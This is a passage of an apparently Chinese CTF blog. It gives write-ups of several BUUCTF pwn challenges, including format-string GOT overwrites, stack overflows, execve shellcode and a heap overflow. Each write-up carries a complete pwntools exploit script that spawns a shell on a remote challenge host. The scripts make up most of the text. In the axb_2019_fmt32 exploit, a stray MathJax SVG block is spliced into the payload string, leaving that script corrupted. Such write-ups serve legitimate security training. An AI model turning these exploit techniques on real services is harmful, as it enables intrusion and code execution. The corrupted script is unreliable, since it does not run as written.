class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Dis</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upd</span>(<span class="hljs-params">index, length, text</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x8</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>Del(<span class="hljs-number">0</span>)<br>Add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>gdb.attach(p)<br>Dis(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>, free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>Upd(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span>, p32(sys_addr))<br>Del(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="五、axb-2019-fmt32"><a href="#五、axb-2019-fmt32" class="headerlink" title="五、axb_2019_fmt32"></a>五、axb_2019_fmt32</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824223244646.png" alt="image-20210824223244646"></p><p>惯例checksec，32位，开了NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225801805.png" alt="image-20210824225801805"></p><p>IDA里面很明显的就是给了格式化字符串，题目也暗示了。但是由于程序内很干净，没有什么其他函数，那要getshell，就得先格式化字符串泄露出libc，再借用格式化字符串写到栈上，我想了一下，栈还要再泄露出栈地址，也可以实现（因为有个函数environ就是存了栈地址的），所以这边我转念想到劫持got表就不要这么麻烦，got地址又是直接已知的</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225741699.png" alt="image-20210824225741699"></p><p>然后先计算偏移，这边可以看见，我是输入了4个a的，但是很明显是没有对齐的，所以之后写payload的时候，要先补齐一个字符，所以我们的偏移从第八个开始</p><p>然后这题是有限时的，所以我们利用%x$n的时候，分两次劫持，写成hn（如果hn也超时，那就hhn），这样输入更快捷。不然会timeout</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210825001757873.png" alt="image-20210825001757873"></p><p>最后就是选择劫持strlen，刚开始是劫持printf的，但是可能是因为在之前有个地方已经调用了printf打印一句话导致出错，然后这边劫持的时候，要在/bin/sh前加上分号，因为我们输入的地方前面其实已经有一串字符串，所以要分隔开，才能识别出/bin/sh</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210825002000682.png" alt="image-20210825002000682"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27607</span>)<br><span class="hljs-comment">#p = process(&#x27;./axb_2019_fmt32&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./axb_2019_fmt32&quot;</span>)<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>strlen_got = elf.got[<span class="hljs-string">&quot;strlen&quot;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(printf_got) + <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-string">&quot;%8$s&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;xxxx&quot;</span>)<br>printf = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(printf))<br>sys = printf - <span class="hljs-number">0xe6e0</span><br>sys_high = (sys &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>sys_low =  (sys) &amp; <span class="hljs-number">0xFFFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sys--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;low--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_low))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;high--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_high))<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(sys_low - <span class="hljs-number">18</span>) + <span class="hljs-string">&quot;c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.679ex" height="2.676ex" style="vertical-align: -0.505ex;" viewbox="0 -934.9 3306.4 1152.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title"><title id="MathJax-SVG-1-Title">hn" + '%' +str(sys_high - sys_low) +"c%9</title><defs aria-hidden="true"><path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/><path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/><path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/><path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/><path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true"> <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/> <use xlink:href="#E1-MJMATHI-6E" x="576" y="0"/> <use xlink:href="#E1-MJMAIN-22" x="1454" y="0"/><g transform="translate(2233,0)"> <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/> <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/></g></g></svg>hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload= <span class="hljs-string">&quot;;/bin/sh\x00&quot;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="六、bbys-tu-2016"><a href="#六、bbys-tu-2016" class="headerlink" title="六、bbys_tu_2016"></a>六、bbys_tu_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151052237.png" alt="image-20210826151052237"></p><p>常规checksec一下，32位，开了NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151038100.png" alt="image-20210826151038100"></p><p>进入IDA，发现有个后门函数，并且主函数十分简单，就给了个很明显的溢出，那就直接跳转到后门函数即可</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826150923013.png" alt="image-20210826150923013"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151009378.png" alt="image-20210826151009378"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151024405.png" alt="image-20210826151024405"></p><p>这边就是IDA里面的溢出不对，所以要去gdb里面动态调试计算偏移才行</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151210436.png" alt="image-20210826151210436"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27835</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x804856D</span>)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="七、pwnable-start"><a href="#七、pwnable-start" class="headerlink" title="七、pwnable_start"></a>七、pwnable_start</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151445256.png" alt="image-20210826151445256"></p><p>常规checksec，32位，什么保护都没开</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151616994.png" alt="image-20210826151616994"></p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151627593.png" alt="image-20210826151627593"></p><p>进入IDA，只存在start，并没有main函数，只能看汇编</p><p>通过直接看汇编，或者进行gdb调试，都能获得输入点距离返回地址长度为0x14</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826165108914.png" alt="image-20210826165108914"></p><p>在gdb里面可以发现，当执行到ret，esp指向的地方存着一个栈上的地址，所以可以据此，我们先跳转到wirte函数，把esp指向的地方输出出来，从而获得栈上地址。</p><p>然后，因为跳转程序，同样会再次执行read，此时我们输入的栈地址比我们泄露的栈地址刚好少4个字节，因为最后都会执行到add esp,0x14，所以偏移仍然是0x14，再解释下为什么esp距离我们写入的/bin/sh\x00会差0x18，是因为执行ret时，会执行pop，所以会多4个字节</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826173800838.png" alt="image-20210826173800838"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26799</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;CTF:&quot;</span>)<br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(shellcode)<br>addr = u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-built_in">hex</span>(addr))<br><br>shellcode = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">8</span>) +p32(addr+<span class="hljs-number">0x14</span>)<br>shellcode += asm(<span class="hljs-string">&quot;lea ebx,[esp-0x18]&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;mov eax,0xb&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor ecx,ecx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor edx,edx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;int 0x80&quot;</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="八、picoctf-2018-echo-back"><a href="#八、picoctf-2018-echo-back" class="headerlink" title="八、picoctf_2018_echo_back"></a>八、picoctf_2018_echo_back</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182247503.png" alt="image-20210826182247503"></p><p>常规checksec一下，32位，开了NX、Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182506261.png" alt="image-20210826182506261"></p><p>进入IDA，很明显的格式化字符串，跟这篇文章的第五题比较相似。但是少了循环，多了system函数调用，所以我们在劫持got表时需要让程序能再执行一次vuln函数，让我们能输入/bin/sh\x00，不需要泄露libc基址</p><p>因为后面有执行puts函数，那可以把puts的got表修改为vuln函数的起始地址</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826191303201.png" alt="image-20210826191303201"></p><p>偏移是7</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826184836372.png" alt="image-20210826184836372"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27830</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804A010</span><br>sys_plt = <span class="hljs-number">0x08048460</span><br>puts_got = <span class="hljs-number">0x0804A01C</span><br>vuln = <span class="hljs-number">0x080485AB</span><br><br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(puts_got+<span class="hljs-number">2</span>) + p32(printf_got) + p32(puts_got) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%8$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8460</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%9$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85AB</span>-<span class="hljs-number">0x8460</span>) + <span class="hljs-string">&quot;c%10$hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="九、ciscn-2019-sw-1"><a href="#九、ciscn-2019-sw-1" class="headerlink" title="九、ciscn_2019_sw_1"></a>九、ciscn_2019_sw_1</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194736365.png" alt="image-20210826194736365"></p><p>常规checksec，32位，开了NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194146179.png" alt="image-20210826194146179"></p><p>进入IDA，这题也是一道格式化字符串，而且仔细看，跟第八题几乎一样，并且也是存在调用了system函数，不需要泄露</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826195039322.png" alt="image-20210826195039322"></p><p>偏移为4</p><p>这边因为printf后续也没别的函数，所以要让程序再执行一次就要去找在printf之后，程序还调用了什么东西，然后去把这个修改为main函数地址</p><p>linux中在程序结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。所以这边把fini.array中的函数指针改写为main函数地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27862</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804989C</span><br>system_plt = <span class="hljs-number">0x080483D0</span><br>fini = <span class="hljs-number">0x0804979C</span><br>main = <span class="hljs-number">0x8048534</span><br><br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(fini+<span class="hljs-number">2</span>) + p32(printf_got) + p32(fini) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%4$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%5$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x83D0</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%6$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8534</span>-<span class="hljs-number">0x83D0</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="十、cmcc-pwnme2"><a href="#十、cmcc-pwnme2" class="headerlink" title="十、cmcc_pwnme2"></a>十、cmcc_pwnme2</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143550209.png" alt="image-20210827143550209"></p><p>常规checksec，32位，开启NX</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145058312.png" alt="image-20210827145058312"></p><p>进入IDA，程序存在明显溢出，然后存在这个后门函数可以打印flag，也就是我们只需要让string里面放着的是flag即可跳转到这获得flag。</p><p>所以先溢出到返回地址，在返回地址填上输入函数gets，往string里面写入flag</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145907550.png" alt="image-20210827145907550"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwnme2&#x27;</span>)<br>string = <span class="hljs-number">0x0804A060</span><br>gets = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p32(gets) + p32(<span class="hljs-number">0x080485CB</span>) + p32(string)<br>p.recvuntil(<span class="hljs-string">&quot;input:&quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;./flag&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="十一、hitcontraining-magicheap"><a href="#十一、hitcontraining-magicheap" class="headerlink" title="十一、hitcontraining_magicheap"></a>十一、hitcontraining_magicheap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153019146.png" alt="image-20210827153019146"></p><p>常规checksec，64位，根据题目是道堆题，开了NX、Canary</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153850520.png" alt="image-20210827153850520"></p><p>进入IDA，发现给了个后门函数，好东西</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155315034.png" alt="image-20210827155315034"></p><p>这边如果magic &gt;4869就可以执行到后门函数</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155753245.png" alt="image-20210827155753245"></p><p>漏洞点可以说是十分明显了，这边edit函数里面输入的长度都没有检查的</p><p>思路：通过堆溢出，覆盖后面堆块，把堆块申请到magic前面，把magic的值修改成大于4869</p><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827161445791.png" alt="image-20210827161445791"></p><p>成功getshell</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29052</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span 